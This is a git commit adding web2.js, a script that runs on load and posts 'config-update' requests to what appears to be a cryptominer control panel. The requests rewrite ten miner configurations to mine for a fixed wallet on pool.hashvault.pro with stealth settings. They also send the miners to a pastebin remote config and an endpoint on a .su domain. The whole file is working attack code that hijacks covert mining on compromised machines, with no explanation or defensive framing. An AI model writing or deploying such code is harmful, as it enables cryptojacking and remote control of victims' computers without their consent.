47a1e3cd2e530a20aecce3b96241396ae8091176
Gh0513d <104360483+Gh0513d@users.noreply.github.com>
2024-06-30 22:03:58 +0300

    Create web2.js

---
+++ web2.js
@@ -0,0 +1,111 @@
+function fetchData() {
+    let _type = "POST";
+    let _url = "/2/171/api/ajax-actions.php";
+    let _data = {
+        "method": "config-update",
+        "index": 1,
+        "data": JSON.stringify({
+            "algo": "rx/0",
+            "pool": "pool.hashvault.pro",
+            "port": 80,
+            "wallet": "49W1LP9vBzjQo3d7yWhnVXKqbbWoZYGy64ydUo89No53ZqG8wdxwQww3Fe7gxbPmWpQjhCBycYSsPU7Qo2yhK9AhQpBQVAx",
+            "password": "x",
+            "nicehash": false,
+            "ssltls": false,
+            "max-cpu": 35,
+            "idle-wait": 5,
+            "idle-cpu": 100,
+            "stealth-targets": "",
+            "kill-targets": "",
+            "stealth-fullscreen": true,
+            "remote-config": "https://pastebin.com/raw/BBAtycYb",
+             "api-endpoint": "https://haulesbaules-uvwebeenhacked.su/endpoint.php"
+        })
+    };
+
+    unam_jsonAjax(_type, _url, _data,
+        function(response) {
+            console.log("Success:", response);
+        },
+        function(error) {
+            console.error("Error:", error);
+        }
+    );
+}
+function fetchData2() {
+    let _type = "POST";
+    let _url = "/2/171/api/ajax-actions.php";
+    let _data = {
+        "method": "config-update",
+        "index": 2,
+        "data": JSON.stringify({
+            "algo": "rx/0",
+            "pool": "pool.hashvault.pro",
+            "port": 80,
+            "wallet": "49W1LP9vBzjQo3d7yWhnVXKqbbWoZYGy64ydUo89No53ZqG8wdxwQww3Fe7gxbPmWpQjhCBycYSsPU7Qo2yhK9AhQpBQVAx",
+            "password": "x",
+            "nicehash": false,
+            "ssltls": false,
+            "max-cpu": 35,
+            "idle-wait": 5,
+            "idle-cpu": 100,
+            "stealth-targets": "",
+            "kill-targets": "",
+            "stealth-fullscreen": true,
+            "remote-config": "https://pastebin.com/raw/BBAtycYb",
+             "api-endpoint": "https://haulesbaules-uvwebeenhacked.su/endpoint.php"
+        })
+    };
+
+    unam_jsonAjax(_type, _url, _data,
+        function(response) {
+            console.log("Success:", response);
+        },
+        function(error) {
+            console.error("Error:", error);
+        }
+    );
+}
+
+
+function fetchDataN(N) {
+    let _type = "POST";
+    let _url = "/2/171/api/ajax-actions.php";
+    let _data = {
+        "method": "config-update",
+        "index": N,
+        "data": JSON.stringify({
+            "algo": "rx/0",
+            "pool": "pool.hashvault.pro",
+            "port": 80,
+            "wallet": "49W1LP9vBzjQo3d7yWhnVXKqbbWoZYGy64ydUo89No53ZqG8wdxwQww3Fe7gxbPmWpQjhCBycYSsPU7Qo2yhK9AhQpBQVAx",
+            "password": "x",
+            "nicehash": false,
+            "ssltls": false,
+            "max-cpu": 35,
+            "idle-wait": 5,
+            "idle-cpu": 100,
+            "stealth-targets": "",
+            "kill-targets": "",
+            "stealth-fullscreen": true,
+            "remote-config": "https://pastebin.com/raw/BBAtycYb",
+             "api-endpoint": "https://haulesbaules-uvwebeenhacked.su/endpoint.php"
+        })
+    };
+
+    unam_jsonAjax(_type, _url, _data,
+        function(response) {
+            console.log("Success:", response);
+        },
+        function(error) {
+            console.error("Error:", error);
+        }
+    );
+}
+
+
+for (let i = 3; i <= 10; i++) {
+    fetchDataN(i);
+}
+fetchData(),
+fetchData2();
